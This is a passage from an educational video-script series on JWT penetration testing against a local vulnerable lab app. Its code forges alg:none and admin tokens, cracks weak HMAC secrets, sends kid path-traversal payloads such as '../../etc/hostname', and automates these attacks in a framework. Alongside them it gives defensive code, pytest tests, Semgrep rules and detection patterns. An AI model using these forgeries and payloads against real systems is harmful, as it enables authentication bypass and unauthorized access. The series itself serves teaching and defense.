print(f"\n[*] Response: {r.status_code}")
print(f"[*] Body: {r.text}")
```

**[VISUAL: Terminal showing successful authentication.]**

**NARRATOR:**
"The server extracted our public key from the token header and used it to verify the signature. We signed with the matching private key. Of course it validates — the attacker controls both sides of the verification."

---

### SCENE 5: Defense & Recap (10:30 - 12:00)

**[VISUAL: Summary of all three injection attacks.]**

**NARRATOR:**
"Three header injection attacks. One defense principle: the token should never tell you how to verify itself."

```python
# SECURE: kid from allowlist only
VALID_KEYS = {"key-2024-primary": "actual-secret"}

def verify(token):
    header = jwt.get_unverified_header(token)
    kid = header.get("kid", "")

    # Reject dangerous headers
    if any(h in header for h in ["jwk", "jku", "x5u"]):
        raise AuthError("Embedded keys rejected")

    # kid must be alphanumeric — no paths, no SQL
    if not re.match(r'^[a-zA-Z0-9\-]+$', kid):
        raise AuthError("Invalid kid format")

    key = VALID_KEYS.get(kid)
    if not key:
        raise AuthError("Unknown key ID")

    return jwt.decode(token, key, algorithms=["HS256"])
```

"Validate kid against an allowlist. Reject jwk, jku, and x5u headers entirely. Never use header values in file paths or SQL queries. The verification key comes from your configuration — never from the token."

---

## Episode 07: Token Theft, Replay & Chaining

**Duration:** 10 minutes
**Level:** L2 - Advanced Exploitation
**Learning Objective:** Exploit token storage and transport weaknesses, perform replay attacks, and chain multiple JWT vulnerabilities into a full compromise.

---

### SCENE 1: Token in URL — The Easiest Theft (0:00 - 2:30)

**[VISUAL: Browser address bar with a JWT in the query string.]**

**NARRATOR:**
"Our vulnerable app has an endpoint that accepts JWT tokens in the URL query string."

```python
import requests

# First, get a valid token
r = requests.post('http://127.0.0.1:5000/login',
                  json={'username': 'bob', 'password': 'password123'})
bob_token = r.json()['token']

# This endpoint accepts token in the URL
r = requests.get(
    f'http://127.0.0.1:5000/api/token-in-url?token={bob_token}'
)
print(f"URL token accepted: {r.status_code}")
print(f"Response: {r.text}")
```

**[VISUAL: Show all the places URL tokens leak.]**

**NARRATOR:**
"When tokens are in URLs, they leak everywhere:"

```
1. Browser history     → Anyone with physical access
2. Server access logs  → Anyone with log access
3. Referer headers     → Any linked external site
4. Proxy logs          → Network monitoring tools
5. Analytics platforms → Third-party JavaScript
6. Screen recordings   → Demos and support sessions
```

"That's six attack vectors from a single design decision. The mitigation is simple: never put tokens in URLs. Use the Authorization header or HttpOnly cookies."

---

### SCENE 2: Missing Token Revocation (2:30 - 5:00)

**[VISUAL: Code editor — password change without token revocation.]**

**NARRATOR:**
"Bob changes his password. In a secure system, all existing tokens should be invalidated. Let's test."

```python
# Step 1: Get Bob's token
r = requests.post('http://127.0.0.1:5000/login',
                  json={'username': 'bob', 'password': 'password123'})
old_token = r.json()['token']
print(f"[*] Got Bob's token before password change")

# Step 2: Verify it works
r = requests.get('http://127.0.0.1:5000/api/profile',
                 headers={'Authorization': f'Bearer {old_token}'})
print(f"[*] Before change: {r.status_code} — {r.text[:50]}")

# Step 3: Change Bob's password
r = requests.post('http://127.0.0.1:5000/api/change-password',
                  json={'new_password': 'new-password-456'},
                  headers={'Authorization': f'Bearer {old_token}'})
print(f"[*] Password changed: {r.status_code}")

# Step 4: Try the OLD token again
r = requests.get('http://127.0.0.1:5000/api/profile',
                 headers={'Authorization': f'Bearer {old_token}'})
print(f"[*] After change with OLD token: {r.status_code}")

if r.status_code == 200:
    print("[+] VULNERABILITY: Old token still works after password change!")
    print("[+] Stolen tokens survive credential rotation")
```

**[VISUAL: Terminal showing the old token still works.]**

**NARRATOR:**
"The old token still works. Bob changed his password — maybe because he suspected compromise — but any stolen token remains valid until it expires. Without token revocation, password changes provide a false sense of security."

---

### SCENE 3: Chaining Vulnerabilities (5:00 - 8:00)

**[VISUAL: Attack chain diagram.]**

**NARRATOR:**
"Now let's chain multiple vulnerabilities into a complete attack. In a real penetration test, you rarely exploit a single bug in isolation."

```python
print("=" * 60)
print("ATTACK CHAIN: From Zero to Full Admin Access")
print("=" * 60)

# Chain Step 1: Reconnaissance
print("\n[CHAIN STEP 1] Token Analysis")
r = requests.post('http://127.0.0.1:5000/login',
                  json={'username': 'alice', 'password': 'password123'})
token = r.json()['token']
# → Reveals: HS256, weak claims validation

# Chain Step 2: Crack the secret
print("[CHAIN STEP 2] Brute-force HMAC secret")
# → Already cracked: "password123"
secret = "password123"

# Chain Step 3: Forge admin token
print("[CHAIN STEP 3] Forge admin token with cracked secret")
admin_token = jwt.encode(
    {"sub": "alice", "role": "admin", "exp": 9999999999},
    secret,
    algorithm="HS256"
)

# Chain Step 4: Access all endpoints
print("[CHAIN STEP 4] Access admin endpoints")
for endpoint in ['/api/profile', '/api/admin', '/api/data']:
    r = requests.get(f'http://127.0.0.1:5000{endpoint}',
                    headers={'Authorization': f'Bearer {admin_token}'})
    print(f"  {endpoint}: {r.status_code}")

# Chain Step 5: Exploit missing revocation for persistence
print("[CHAIN STEP 5] Establish persistence")
print("  → Token has exp=9999999999 (year 2286)")
print("  → No jti claim — no revocation possible")
print("  → Password changes won't invalidate this token")

print("\n[RESULT] Complete compromise:")
print("  - Admin access to all endpoints")
print("  - Token valid until 2286")
print("  - Survives password changes")
print("  - No server-side revocation mechanism")
```

**[VISUAL: Terminal showing the full chain executing.]**

**NARRATOR:**
"Five steps. Reconnaissance revealed HS256 and weak claims. The secret was crackable. Claims validation was missing. No revocation mechanism. The result: a permanent admin token that survives credential rotation."

---

### SCENE 4: Defense & Recap (8:00 - 10:00)

**[VISUAL: Defense checklist.]**

**NARRATOR:**
"Breaking the chain at any point prevents the full compromise."

```
Break at Step 2: Strong secret (256-bit random) → Can't crack
Break at Step 3: Proper claims validation → Forged token rejected
Break at Step 4: Audience per endpoint → Cross-endpoint access blocked
Break at Step 5: Token revocation (Redis deny-list) → Persistence impossible
```

"Defense in depth means the attacker needs to bypass every layer. In this chain, one strong control at any step would have stopped us."

"That wraps up L2 exploitation. Next: building an automated testing framework for L3."

---

## Episode 08: Building a JWT Testing Framework

**Duration:** 12 minutes
**Level:** L3 - Red Team Operations
**Learning Objective:** Build a modular, reusable JWT security testing framework that automates the discovery and exploitation of common JWT vulnerabilities.

---

### SCENE 1: Why Automate? (0:00 - 1:30)

**[VISUAL: Side-by-side comparison — manual testing vs automated framework.]**

**NARRATOR:**
"In episodes one through seven, we tested each vulnerability manually. That's essential for learning. But in a real engagement with dozens of endpoints and a deadline, you need automation."

"We're going to build a modular JWT testing framework. Each attack becomes a test module. You point it at a target, and it runs every check automatically."

---

### SCENE 2: Framework Architecture (1:30 - 4:00)

**[VISUAL: Code editor — `jwt_pentest_framework.py`]**

**NARRATOR:**
"The framework has three layers: a scanner that coordinates tests, individual test modules, and a results reporter."

```python
#!/usr/bin/env python3
"""
JWT Security Testing Framework
Module: EG-LAB-JWT-PENTEST-001
For authorized security testing only.
"""

import jwt
import hmac
import hashlib
import base64
import json
import time
import requests
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime, timezone

@dataclass
class Finding:
    """A security finding from JWT testing."""
    title: str
    severity: str          # Critical, High, Medium, Low, Info
    description: str
    evidence: str
    remediation: str
    cvss_score: float = 0.0
    endpoint: str = ""

@dataclass
class JWTPentestFramework:
    """Modular JWT security testing framework."""
    base_url: str
    token: str = ""
    findings: list = field(default_factory=list)

    def run_all_tests(self, token: str):
        """Run all JWT security tests."""
        self.token = token
        print("=" * 60)
        print("JWT Security Testing Framework v1.0")
        print(f"Target: {self.base_url}")
        print(f"Time: {datetime.now(timezone.utc).isoformat()}")
        print("=" * 60)

        self.test_alg_none()
        self.test_weak_secret()
        self.test_expired_tokens()
        self.test_missing_claims()
        self.test_algorithm_confusion()

        self.print_report()

    def test_alg_none(self):
        """Test for alg:none acceptance."""
        print("\n[TEST] alg:none Bypass...")
        parts = self.token.split('.')
        payload_json = json.loads(
            base64url_decode(parts[1])
        )

        for alg_variant in ["none", "None", "NONE", "nOnE"]:
            header = {"alg": alg_variant, "typ": "JWT"}
            h = base64url_encode(json.dumps(header).encode())
            p = base64url_encode(json.dumps(payload_json).encode())
            forged = f"{h}.{p}."

            r = requests.get(
                f"{self.base_url}/api/profile",
                headers={"Authorization": f"Bearer {forged}"}
            )

            if r.status_code == 200:
                self.findings.append(Finding(
                    title="alg:none Token Accepted",
                    severity="Critical",
                    description=f"Server accepts tokens with alg={alg_variant}",
                    evidence=f"Forged token accepted: HTTP {r.status_code}",
                    remediation="Specify algorithms parameter explicitly",
                    cvss_score=9.8,
                    endpoint="/api/profile"
                ))
                print(f"  [CRITICAL] alg={alg_variant} ACCEPTED!")
                return
        print("  [PASS] alg:none rejected")

    def test_weak_secret(self):
        """Test for weak HMAC secrets."""
        print("\n[TEST] Weak HMAC Secret...")
        common = [
            "secret", "password", "password123", "123456",
            "jwt_secret", "changeme", "test", "default"
        ]

        parts = self.token.split('.')
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected_sig = base64url_decode(parts[2])

        for secret in common:
            computed = hmac.new(
                secret.encode(), signing_input, hashlib.sha256
            ).digest()

            if hmac.compare_digest(computed, expected_sig):
                self.findings.append(Finding(
                    title="Weak HMAC Secret",
                    severity="Critical",
                    description=f"JWT secret is '{secret}'",
                    evidence=f"Secret cracked from common wordlist",
                    remediation="Use 256-bit cryptographically random secret",
                    cvss_score=9.8
                ))
                print(f"  [CRITICAL] Secret found: '{secret}'")
                return
        print("  [PASS] Secret not in common wordlist")

    def test_expired_tokens(self):
        """Test if expired tokens are accepted."""
        print("\n[TEST] Expired Token Acceptance...")
        parts = self.token.split('.')
        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))

        alg = header.get('alg', 'HS256')
        # This test requires a known secret
        # (would be found by test_weak_secret first)

    def test_missing_claims(self):
        """Test for missing required claims."""
        print("\n[TEST] Missing Claims...")
        parts = self.token.split('.')
        payload = json.loads(base64url_decode(parts[1]))

        missing = []
        for claim in ['exp', 'aud', 'iss', 'jti']:
            if claim not in payload:
                missing.append(claim)

        if missing:
            self.findings.append(Finding(
                title="Missing JWT Claims",
                severity="Medium",
                description=f"Token missing: {', '.join(missing)}",
                evidence=f"Decoded payload lacks {missing}",
                remediation="Require exp, aud, iss, jti in all tokens",
                cvss_score=5.3
            ))
            print(f"  [MEDIUM] Missing claims: {missing}")
        else:
            print("  [PASS] All standard claims present")

    def test_algorithm_confusion(self):
        """Test for RS256/HS256 algorithm confusion."""
        print("\n[TEST] Algorithm Confusion...")
        # Attempt to fetch public key from common endpoints
        key_urls = [
            f"{self.base_url}/.well-known/jwks.json",
            f"{self.base_url}/api/rs256/public-key",
            f"{self.base_url}/public-key",
        ]
        for url in key_urls:
            try:
                r = requests.get(url, timeout=3)
                if r.status_code == 200 and ('BEGIN PUBLIC KEY' in r.text
                                              or '"kty"' in r.text):
                    print(f"  [INFO] Public key found at {url}")
                    self.findings.append(Finding(
                        title="Public Key Exposed",
                        severity="Info",
                        description=f"RSA public key available at {url}",
                        evidence="Key can be used for algorithm confusion test",
                        remediation="Restrict key exposure if not needed",
                        cvss_score=0.0,
                        endpoint=url
                    ))
            except requests.RequestException:
                continue
        print("  [INFO] Manual algorithm confusion testing recommended")

    def print_report(self):
        """Print the findings report."""
        print("\n" + "=" * 60)
        print("FINDINGS REPORT")
        print("=" * 60)
        print(f"Total findings: {len(self.findings)}")

        severity_order = {
            "Critical": 0, "High": 1, "Medium": 2,
            "Low": 3, "Info": 4
        }
        sorted_findings = sorted(
            self.findings,
            key=lambda f: severity_order.get(f.severity, 5)
        )

        for i, f in enumerate(sorted_findings, 1):
            print(f"\n--- Finding {i}: [{f.severity}] {f.title} ---")
            print(f"  CVSS: {f.cvss_score}")
            print(f"  Description: {f.description}")
            print(f"  Evidence: {f.evidence}")
            print(f"  Remediation: {f.remediation}")
            if f.endpoint:
                print(f"  Endpoint: {f.endpoint}")
```

**[VISUAL: Run the framework against the vulnerable app.]**

```python
# Run the framework
framework = JWTPentestFramework(base_url="http://127.0.0.1:5000")

# Get a token
r = requests.post('http://127.0.0.1:5000/login',
                  json={'username': 'alice', 'password': 'password123'})
token = r.json()['token']

framework.run_all_tests(token)
```

**[VISUAL: Terminal showing automated test execution and findings report.]**

---

### SCENE 3: Extending the Framework (4:00 - 10:00)

**[VISUAL: Adding test modules.]**

**NARRATOR:**
"The framework is extensible. Add test modules for kid injection, JWK injection, token-in-URL detection, and missing revocation."

```python
def test_kid_injection(self):
    """Test kid header for path traversal and SQL injection."""
    print("\n[TEST] kid Injection...")

    # Path traversal payloads
    traversal_payloads = [
        "../../../dev/null",
        "../../etc/hostname",
        "/dev/null",
    ]

    for payload_kid in traversal_payloads:
        try:
            forged = jwt.encode(
                {"sub": "test", "role": "admin", "exp": 9999999999},
                "",  # Empty secret for /dev/null
                algorithm="HS256",
                headers={"kid": payload_kid}
            )
            r = requests.get(
                f"{self.base_url}/api/kid/data",
                headers={"Authorization": f"Bearer {forged}"}
            )
            if r.status_code == 200:
                self.findings.append(Finding(
                    title="kid Path Traversal",
                    severity="Critical",
                    description=f"kid='{payload_kid}' accepted",
                    evidence=f"HTTP {r.status_code}: {r.text[:80]}",
                    remediation="Validate kid against allowlist",
                    cvss_score=9.8,
                    endpoint="/api/kid/data"
                ))
                print(f"  [CRITICAL] Traversal: kid='{payload_kid}'")
                return
        except Exception:
            continue
    print("  [PASS] kid traversal payloads rejected")

def test_token_in_url(self):
    """Test if tokens accepted in URL query parameters."""
    print("\n[TEST] Token in URL...")
    r = requests.get(
        f"{self.base_url}/api/token-in-url?token={self.token}"
    )
    if r.status_code == 200:
        self.findings.append(Finding(
            title="Token Accepted in URL",
            severity="High",
            description="JWT accepted via query parameter",
            evidence=f"GET /api/token-in-url?token=... → {r.status_code}",
            remediation="Accept tokens only via Authorization header",
            cvss_score=7.5,
            endpoint="/api/token-in-url"
        ))
        print("  [HIGH] Token accepted in URL query string")
    else:
        print("  [PASS] URL tokens rejected")
```

**[VISUAL: Run the extended framework showing all test modules executing.]**

**NARRATOR:**
"Each test module follows the same pattern: craft a payload, send it, check the response, record the finding. The framework handles reporting and severity classification."

---

### SCENE 4: Recap (10:00 - 12:00)

**[VISUAL: Framework architecture diagram.]**

**NARRATOR:**
"A modular testing framework turns hours of manual testing into minutes of automated scanning. The key design principles:"

"One — each test is independent. You can run them individually or all together."

"Two — findings are structured data. CVSS scores, evidence, remediation — ready for your report."

"Three — it's extensible. New vulnerability class? Add a test module."

"Next episode: integrating JWT security testing into CI/CD pipelines."

---

## Episode 09: CI/CD Integration & Semgrep Rules

**Duration:** 9 minutes
**Level:** L3 - Red Team Operations
**Learning Objective:** Integrate automated JWT security checks into CI/CD pipelines using pytest and Semgrep rules to catch vulnerabilities before deployment.

---

### SCENE 1: Shifting Left (0:00 - 1:30)

**[VISUAL: Diagram showing security checks at different pipeline stages.]**

**NARRATOR:**
"Everything we've demonstrated so far happens post-deployment — you test a running application. But the most cost-effective security testing happens pre-deployment, in the CI/CD pipeline."

"We'll add two layers: pytest-based security tests that run against your JWT implementation, and Semgrep rules that catch dangerous patterns in source code."

---

### SCENE 2: pytest Security Tests (1:30 - 5:00)

**[VISUAL: Code editor — `test_jwt_security.py`]**

**NARRATOR:**
"These tests verify that your JWT implementation rejects the attacks we demonstrated."

```python
"""
JWT Security Tests — CI/CD Integration
Run: pytest test_jwt_security.py -v
"""

import pytest
import jwt
import base64
import json
from datetime import datetime, timedelta, timezone

# Import your application's verify function
# from myapp.auth import verify_token, SECRET_KEY
SECRET_KEY = "your-256-bit-secret"  # From environment in production

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


class TestAlgNoneRejection:
    """Verify alg:none tokens are rejected."""

    @pytest.mark.parametrize("alg", ["none", "None", "NONE", "nOnE"])
    def test_rejects_alg_none(self, alg):
        header = base64url_encode(
            json.dumps({"alg": alg, "typ": "JWT"}).encode()
        )
        payload = base64url_encode(
            json.dumps({"sub": "test", "role": "admin"}).encode()
        )
        forged = f"{header}.{payload}."

        with pytest.raises(jwt.exceptions.InvalidAlgorithmError):
            jwt.decode(forged, SECRET_KEY, algorithms=["HS256"])


class TestClaimsValidation:
    """Verify required claims are enforced."""

    def test_rejects_expired_token(self):
        expired = jwt.encode(
            {"sub": "test", "exp": datetime(2020, 1, 1,
                                            tzinfo=timezone.utc)},
            SECRET_KEY, algorithm="HS256"
        )
        with pytest.raises(jwt.ExpiredSignatureError):
            jwt.decode(expired, SECRET_KEY, algorithms=["HS256"])

    def test_rejects_wrong_audience(self):
        wrong_aud = jwt.encode(
            {"sub": "test", "aud": "wrong-service",
             "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
            SECRET_KEY, algorithm="HS256"
        )
        with pytest.raises(jwt.InvalidAudienceError):
            jwt.decode(wrong_aud, SECRET_KEY,
                      algorithms=["HS256"],
                      audience="correct-service")

    def test_rejects_missing_exp(self):
        no_exp = jwt.encode(
            {"sub": "test"},
            SECRET_KEY, algorithm="HS256"
        )
        with pytest.raises(jwt.MissingRequiredClaimError):
            jwt.decode(no_exp, SECRET_KEY,
                      algorithms=["HS256"],
                      options={"require": ["exp"]})


class TestSecretStrength:
    """Verify the JWT secret meets minimum requirements."""

    def test_secret_minimum_length(self):
        """Secret must be at least 32 bytes (256 bits)."""
        assert len(SECRET_KEY.encode()) >= 32, \
            "JWT secret must be at least 256 bits"

    def test_secret_not_common_password(self):
        """Secret must not be a common password."""
        common = {"secret", "password", "password123", "changeme",
                  "jwt_secret", "test", "default", "123456"}
        assert SECRET_KEY not in common, \
            "JWT secret is a common password!"
```

**[VISUAL: Run pytest with verbose output showing all tests passing.]**

```bash
pytest test_jwt_security.py -v
```

**NARRATOR:**
"Every test verifies a specific attack is blocked. alg:none rejection, claims validation, secret strength. If any test fails, the build fails. No vulnerable code reaches production."

---

### SCENE 3: Semgrep Rules (5:00 - 7:30)

**[VISUAL: Code editor — Semgrep YAML rules.]**

**NARRATOR:**
"Semgrep analyzes source code statically. We write rules that detect dangerous JWT patterns."

```yaml
# jwt-security-rules.yaml
rules:
  - id: jwt-missing-algorithm-allowlist
    patterns:
      - pattern: jwt.decode($TOKEN, $KEY, ...)
      - pattern-not: jwt.decode($TOKEN, $KEY, algorithms=[...], ...)
    message: >
      jwt.decode() called without explicit algorithms parameter.
      This may allow algorithm confusion attacks.
    severity: ERROR
    languages: [python]
    metadata:
      cwe: CWE-327
      references:
        - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

  - id: jwt-weak-hardcoded-secret
    patterns:
      - pattern: jwt.encode($PAYLOAD, "...", ...)
    message: >
      JWT signed with a hardcoded string secret.
      Use environment variables or a secrets manager.
    severity: WARNING
    languages: [python]
    metadata:
      cwe: CWE-798

  - id: jwt-none-algorithm-allowed
    patterns:
      - pattern: |
          jwt.decode($TOKEN, $KEY, algorithms=[..., "none", ...], ...)
    message: >
      The 'none' algorithm is explicitly allowed.
      Remove it to prevent unsigned token attacks.
    severity: ERROR
    languages: [python]

  - id: jwt-token-from-url
    patterns:
      - pattern: request.args.get("token")
    message: >
      JWT token read from URL query parameter.
      Tokens in URLs leak via logs, referer headers, and history.
    severity: WARNING
    languages: [python]
```

**[VISUAL: Run Semgrep against the vulnerable app.]**

```bash
semgrep --config jwt-security-rules.yaml apps/vulnerable-jwt-app.py
```

**[VISUAL: Terminal showing Semgrep findings for each vulnerable pattern.]**

**NARRATOR:**
"Semgrep found every dangerous pattern: missing algorithm allowlist, hardcoded secrets, and token-from-URL. These checks run in seconds and catch issues before a single HTTP request is made."

---

### SCENE 4: Pipeline Integration & Recap (7:30 - 9:00)

**[VISUAL: GitHub Actions workflow file.]**

```yaml
# .github/workflows/jwt-security.yml
name: JWT Security Checks
on: [push, pull_request]

jobs:
  jwt-security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run Semgrep JWT rules
        uses: returntocorp/semgrep-action@v1
        with:
          config: jwt-security-rules.yaml

      - name: Run JWT security tests
        run: |
          pip install pyjwt pytest cryptography
          pytest test_jwt_security.py -v
```

**NARRATOR:**
"Two automated gates. Semgrep catches dangerous patterns in pull requests — before code review. pytest verifies security properties on every push. Both are fast, deterministic, and have zero false positive tolerance."

"The pipeline catches what code review misses, and it never gets tired."

---

## Episode 10: Professional Reporting & Blue Team

**Duration:** 10 minutes
**Level:** L3 - Red Team Operations
**Learning Objective:** Write professional JWT pentest findings with CVSS scoring, and understand the blue team's perspective with detection rules and log analysis.

---

### SCENE 1: Writing Professional Findings (0:00 - 3:00)

**[VISUAL: Professional finding template.]**

**NARRATOR:**
"A penetration test is only as good as its report. Let's structure our findings professionally."

```markdown
## Finding: JWT Algorithm Confusion (RS256 → HS256)

**Severity:** Critical (CVSS 3.1: 9.8)
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)

### Description
The application's `/api/rs256/data` endpoint accepts JWT tokens signed
with HS256 using the RSA public key as the HMAC secret. Since the public
key is available at `/api/rs256/public-key`, any unauthenticated attacker
can forge valid tokens with arbitrary claims.

### Impact
- Complete authentication bypass
- Arbitrary privilege escalation (any role, any user)
- No credentials or secrets required

### Steps to Reproduce
1. Obtain the RSA public key from GET /api/rs256/public-key
2. Craft a JWT with `alg: HS256` and desired payload claims
3. Sign the token using the public key bytes as the HMAC secret
4. Send the forged token to GET /api/rs256/data with Authorization header

### Evidence
Request:
  GET /api/rs256/data HTTP/1.1
  Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIi...

Response:
  HTTP/1.1 200 OK
  {"data": "sensitive information", "user": "attacker", "role": "admin"}

### Remediation
1. Specify a single algorithm in the decode function:
   `jwt.decode(token, key, algorithms=["RS256"])`
2. Never mix symmetric and asymmetric algorithms
3. Use separate key objects for different algorithm types
```

**NARRATOR:**
"Every finding has: severity with CVSS, description explaining the root cause, impact in business terms, reproducible steps, evidence from your testing, and specific remediation. The developer reading this should know exactly what to fix and why it matters."

---

### SCENE 2: CVSS Scoring for JWT Findings (3:00 - 5:00)

**[VISUAL: Table of JWT vulnerabilities with CVSS scores.]**

**NARRATOR:**
"Here's how common JWT vulnerabilities map to CVSS 3.1 scores."

| Vulnerability | CVSS | AV | AC | PR | UI | Impact |
|--------------|------|----|----|----|----|--------|
| alg:none bypass | 9.8 | N | L | N | N | Full auth bypass |
| Weak HMAC secret | 9.8 | N | L | N | N | Token forgery |
| Algorithm confusion | 9.8 | N | L | N | N | Token forgery |
| kid SQL injection | 9.8 | N | L | N | N | Auth bypass + data |
| kid path traversal | 9.1 | N | L | N | N | Auth bypass |
| Missing exp validation | 7.5 | N | L | N | N | Permanent tokens |
| Token in URL | 7.5 | N | L | N | N | Token leakage |
| Missing audience check | 6.5 | N | L | L | N | Cross-service access |
| No token revocation | 5.3 | N | H | L | N | Persistence |

"Notice that most JWT vulnerabilities score Critical or High because they're network-exploitable with low complexity and no authentication required."

---

### SCENE 3: The Blue Team Perspective (5:00 - 8:00)

**[VISUAL: SIEM dashboard with JWT-related alerts.]**

**NARRATOR:**
"As a penetration tester, understanding detection helps you assess the organization's monitoring maturity. Here's what the blue team should be watching for."

```python
# Detection Rule 1: alg:none attempts
# Monitor for tokens where the algorithm is 'none'
def detect_alg_none(token):
    """Alert on unsigned token attempts."""
    try:
        header = json.loads(base64url_decode(token.split('.')[0]))
        if header.get('alg', '').lower() == 'none':
            alert("JWT-001: alg:none token submitted",
                  severity="HIGH",
                  source_ip=request.remote_addr)
    except Exception:
        pass

# Detection Rule 2: Algorithm mismatch
# Alert when the token algorithm doesn't match the expected one
def detect_algorithm_mismatch(token, expected_alg="RS256"):
    """Alert on algorithm switching attempts."""
    try:
        header = json.loads(base64url_decode(token.split('.')[0]))
        actual_alg = header.get('alg', '')
        if actual_alg != expected_alg:
            alert("JWT-002: Algorithm mismatch",
                  detail=f"Expected {expected_alg}, got {actual_alg}",
                  severity="CRITICAL")
    except Exception:
        pass

# Detection Rule 3: Suspicious kid values
# Alert on kid headers containing traversal or injection patterns
SUSPICIOUS_PATTERNS = [
    r'\.\.',           # Path traversal
    r'[\'";]',         # SQL injection
    r'UNION|SELECT',   # SQL keywords
    r'/dev/',          # Device files
    r'/etc/',          # System files
]

def detect_kid_injection(token):
    """Alert on injection attempts via kid header."""
    try:
        header = json.loads(base64url_decode(token.split('.')[0]))
        kid = header.get('kid', '')
        for pattern in SUSPICIOUS_PATTERNS:
            if re.search(pattern, kid, re.IGNORECASE):
                alert("JWT-003: Suspicious kid value",
                      detail=f"kid='{kid}' matches {pattern}",
                      severity="HIGH")
    except Exception:
        pass
```

**NARRATOR:**
"Three detection rules that catch the attacks from episodes two through six. In your pentest report, note whether these detections exist. If they don't, recommend them as part of your remediation."

---

### SCENE 4: Series Conclusion (8:00 - 10:00)

**[VISUAL: Series recap with all 10 episode titles and a timeline showing L1 → L2 → L3 progression.]**

**NARRATOR:**
"That's the complete JWT security testing journey."

"Level 1 gave you the foundations: token analysis, alg:none, brute-forcing secrets, and claims bypass. These are the attacks every tester should check first."

"Level 2 went deeper: algorithm confusion, kid injection, JWK header attacks, and vulnerability chaining. These require more skill but have devastating impact."

"Level 3 moved to operations: automated frameworks, CI/CD integration, and professional reporting. These are what separate a proof-of-concept from a production security program."

**[VISUAL: The JWT Security Testing Checklist — comprehensive.]**

```
JWT Pentest Checklist:
□ Decode and analyze token structure
□ Test alg:none (all case variations)
□ Attempt HMAC secret brute-force
□ Verify exp claim is enforced
□ Verify aud claim is enforced
□ Verify iss claim is enforced
□ Test algorithm confusion (RS256→HS256)
□ Test kid path traversal
□ Test kid SQL injection
□ Test jwk/jku header injection
□ Check for tokens in URL parameters
□ Verify token revocation on password change
□ Check for token lifetime limits
□ Review detection and monitoring capabilities
```

"If you want to validate your skills, take the Level 1, 2, or 3 assessments. And remember — every technique in this series requires explicit written authorization."

"Happy hunting."

**[VISUAL: End card with assessment links and Verifhai branding.]**

---

**Series Version:** 1.0
**Framework:** HAIAMM v2.0
**Practice:** Education & Guidance (EG)
**Module:** EG-LAB-JWT-PENTEST-001
**Author:** Verifhai
